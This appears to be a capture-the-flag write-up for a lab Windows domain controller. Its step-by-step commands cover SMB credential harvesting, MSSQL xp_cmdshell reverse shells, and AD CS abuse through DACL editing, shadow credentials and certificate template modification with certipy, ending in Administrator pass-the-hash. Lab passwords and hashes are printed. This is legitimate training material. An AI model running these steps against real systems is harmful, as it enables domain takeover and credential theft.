# Escapetwo


We have been given creds for `rose:KxEPkKe6R8su`

`nmap --min-rate 10 10.10.11.51 -Pn -p 53,88,135,139,389,445,464,593,636,1433,3268,3269 -A`
```
Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-14 14:14 EST
Nmap scan report for 10.10.11.51
Host is up (0.027s latency).
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-14 19:14:39Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-14T19:15:54+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-14T19:15:54+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info:
|   10.10.11.51:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info:
|   10.10.11.51:1433:
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-14T02:46:24
|_Not valid after:  2055-01-14T02:46:24
|_ssl-date: 2025-01-14T19:15:54+00:00; +1s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
```

`smbclient -L \\10.10.11.51 -U rose`

- get the accounts files from SYSVOL

- Has a sharedstrings.xml file which has creds for
    - angela:0fwz7Q4mSpurIt99
    - oscar:86LxLBMgEWaKUnBG - works for smb
    - kevin:Md9Wlq1E5bZnVDVo
    - sa:MSSQLP@ssw0rd! - works for mssql

- SMBCLIENT on oscar has same privs as rose

- `netexec ldap 10.10.11.51 -u rose --users`

- `sqsh -S 10.10.11.51 -U sa -p `
- start responder and capture the NTLMv2 hash
    - was not cracked
- enable `xp_cmdshell`
- generate a powershell base 64 reverse shell
- start nc listener
- `xp_cmdshell powershell -e base64`
- get a reverse shell connex
- Search for MSQL 2019 config file to find credentials for `sql_svc:WqSZAF6CysDQbGb3`
- Try the same creds with User `ryan` as seen in the Users folder
    - Those work with SMB
- `smbclient -U ryan -P WqSZAF6CysDQbGb3 //10.10.11.51/`
- ### get the flag or do `evil-winrm`

<hr>

- `bloodhound-python -u ryan -p WqSZAF6CysDQbGb3 -d sequel.htb -ns 10.10.11.51 -c All`
- Load the files in bloodhound gui

- We see CA_SVC user connected to SQL_SVC
    - sql_svc has `writeOwner` permissions on ca_svc
- ca_svc is a ceritificate authority service
- https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/?source=post_page-----6725de2a8235--------------------------------

- `certipy find -u 'ryan@sequel.htb' -p 'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51 -vulnerable -enabled`


```
33
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireCommonName
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
```

- ca_svc can make changes to the templates
- since, ryan has writeOwner privs, we can write ryan as the owner of ca_svc
- `bloodyAD --host '10.10.11.51' -d 'escapetwo.htb' -u 'ryan' -p 'WqSZAF6CysDQbGb3' set owner 'ca_svc' 'ryan'`
    - bloodyAD changes the owner of the ca_svc account to ryan.
    - As the new owner, ryan gains the ability to modify permissions for this account.

- `impacket-dacledit  -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/"ryan":"WqSZAF6CysDQbGb3"`
    - modify the dacl (discretionary access control list) of `ca_svc`
    - grant `ryan` full control over `ca_svc`

- `certipy-ad shadow auto -u 'ryan@sequel.htb' -p "WqSZAF6CysDQbGb3" -account 'ca_svc' -dc-ip '10.10.11.51' -target dc01.sequel.htb -ns 10.10.11.51`
    - generate and add a new key credential for `ca_svc`, enabling certificate-based authentication
    - `NT Hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce`
    - saves a .ccache file that can be used with kerberos attacks

- `KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template  -k -template DunderMifflinAuthentication  -target dc01.sequel.htb -dc-ip 10.10.11.51`
    - modify the certificate template to use it for privesc
    - this step adjusts the tempolate's config to allow certificate issuance with escalated privileges

- `certipy-ad req -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target dc01.sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51`
    - request a certificate with the User Principal Name (UPN) - Administrator@sequel.htb, enabling impersonation of the admin account

- `certipy-ad auth -pfx administrator_10.pfx -dc-ip 10.10.11.51`
    - authenticate as the admin using the certificate
    - Select 0
    - retrieves the NTLM hash
    - `Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff`

- `evil-winrm -i 10.10.11.51 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff`
